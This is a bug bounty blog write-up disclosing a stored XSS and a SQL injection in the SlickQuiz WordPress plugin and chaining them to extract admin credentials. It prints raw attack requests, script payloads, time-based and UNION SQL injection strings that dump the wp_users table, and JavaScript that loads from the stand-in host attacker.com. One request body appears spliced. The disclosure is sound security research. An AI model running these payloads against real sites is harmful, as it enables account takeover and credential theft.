---
title: 'H1-4420: From Quiz to Admin - Chaining Two 0-Days to Compromise An Uber Wordpress'
categories:
- BugBounty
- SQLi
- XSS
---
### TL;DR
While doing recon for H1-4420, I stumbled upon a Wordpress blog that had a plugin enabled called [SlickQuiz](https://wordpress.org/plugins/slickquiz/).
Although the latest version 1.3.7.1 was installed and I haven't found any publicly disclosed vulnerabilities, it still 
somehow sounded like a bad idea to run a plugin that hasn't been tested with the last three major versions of Wordpress.

So I decided to go the very same route as I did already for [last year's H1-3120](https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/)
which eventually brought me the MVH title: source code review. And it paid off again: This time, I've found two vulnerabilities named 
CVE-2019-12517 (Unauthenticated Stored XSS) and CVE-2019-12516 (Authenticated SQL Injection) which can be chained 
together to take you from being an unauthenticated Wordpress visitor to the admin credentials.

Due to the sensitivity of disclosed information I'm using an own temporarily installed Wordpress blog throughout this 
blog article to demonstrate the vulnerabilities and the impact.

### CVE-2019-12517: Going From Unauthenticated User to Admin via Stored XSS
During the source code review, I stumbled upon multiple (obvious) stored XSS vulnerabilities when saving 
user scores of quizzes. **Important side note**: It does not matter whether "Save user scores" plugin option is disabled 
(default) or enabled, the pure presence of a quiz is sufficient for explotiation since this option does only 
disable/enable the UI elements.

The underlying issue is located in ``php/slickquiz-scores.php`` in the method ``generate_score_row()`` (lines 38-52) 
where the responses to quizzes are returned without encoding them first:

{% highlight php %}
function generate_score_row( $score )
        {
            $scoreRow = '';

            $scoreRow .= '<tr>';
            $scoreRow .= '<td class="table_id">' . $score->id . '</td>';
            $scoreRow .= '<td class="table_name">' . $score->name . '</td>';
            $scoreRow .= '<td class="table_email">' . $score->email . '</td>';
            $scoreRow .= '<td class="table_score">' . $score->score . '</td>';
            $scoreRow .= '<td class="table_created">' . $score->createdDate . '</td>';
            $scoreRow .= '<td class="table_actions">' . $this->get_score_actions( $score->id ) . '</td>';
            $scoreRow .= '</tr>';

            return $scoreRow;
        }
{% endhighlight %}

Since ``$score->name ``, ``$score->email `` and ``$score->score`` are use-controllable, a simple request like the 
following is enough to get three XSS payloads into the SlickQuiz backend:

{% highlight php %}
POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 165
DNT: 1
Connection: close

action=save_quiz_score&json={"name":"xss<script>alert(1)</script>","email":"test@localhost<script>alert(2)</script>","score":"<script>alert(3)</script>","quiz_id":1}{% endhighlight %}

As soon as any user with access to the SlickQuiz dashboard visits the user scores, all payloads fire immediately:

![]({{ site.baseurl }}/assets/slickquiz-1.png)

So far so good. That's already a pretty good impact, but there must be more.

### CVE-2019-12516: Authenticated SQL Injections To the Rescue
The SlickQuiz plugin is also vulnerable to multiple authenticated SQL Injections almost whenever the ``id`` 
parameter is present in any request. For example the following requests:

````
/wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a)
/wp-admin/admin.php?page=slickquiz-edit&id=(select*from(select(sleep(5)))a)
/wp-admin/admin.php?page=slickquiz-preview&id=(select*from(select(sleep(5)))a)
````

all cause a 5 second delay:

![]({{ site.baseurl }}/assets/slickquiz-2.png)

The underlying issue of i.e. the ``/wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a)`` 
vulnerability is located in ``php/slickquiz-scores.php`` in the constructor method (line 20) where the GET parameter ``id`` 
is directly supplied to the method ``get_quiz_by_id()``:

{% highlight php %}
$quiz = $this->get_quiz_by_id( $_GET['id'] );
{% endhighlight %}

Whereof the method ``get_quiz_by_id()`` is defined in ``php/slickquiz-model.php`` (lines 27-35):

{% highlight php %}
function get_quiz_by_id( $id )
        {
            global $wpdb;
            $db_name = $wpdb->prefix . 'plugin_slickquiz';

            $quizResult = $wpdb->get_row( "SELECT * FROM $db_name WHERE id = $id" );

            return $quizResult;
        }
{% endhighlight %}

Another obvious one.

### Connecting XSS and SQLi for Takeover
Now let's connect both vulnerabilities to get a real Wordpress takeover :-)

First of all: Let's get the essential login details of the first Wordpress user (likely to be the admin): user's email, 
login name and hashed password. I've built this handy SQLi payload to achieve that:

{% highlight php %}
1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users--
{% endhighlight %}

This eventually returns requested data within an ``<h2>`` tag:

![]({{ site.baseurl }}/assets/slickquiz-3.png)

With this payload and a little bit of JavaScript, it's now possible to exploit the SQLi using a JavaScript ``XMLHttpRequest``:

{% highlight javascript %}
let url = 'http://localhost/wordpress/wp-admin/admin.php?page=slickquiz-scores&id=';
let payload = '1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users--'

let xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.onreadystatechange = function() {
  if (xhr.readyState === XMLHttpRequest.DONE) {
    let result = xhr.responseText.match(/(?:<h2>SlickQuiz Scores for ")(.*)(?:"<\/h2>)/);
    alert(result[1]);
  }
}

xhr.open('GET', url + payload, true);
xhr.send();
{% endhighlight %}

Now changing the XSS payload to:

{% highlight php %}
POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 165
DNT: 1
Connection: close

action=save_quiz_score&json={"name":"xss","email":"test@localhost<script src='http://www.attacker.com/slickquiz.js'>","score":"1 / 1","quiz_id":1}on=save_quiz_score&json={"name":"xss<script>alert(1)</script>","email":"test@localhost<script src='http://www.attacker.com/slickquiz.js'>","score":"1 / 1","quiz_id":1}
{% endhighlight %}

Will cause the XSS to fire and alert the Wordpress credentials:

![]({{ site.baseurl }}/assets/slickquiz-4.png)

From this point on, everything's possible, just like sending this data cross-domain via another ``XMLHttpRequest`` etc.

Thanks Uber for the nice bounty!
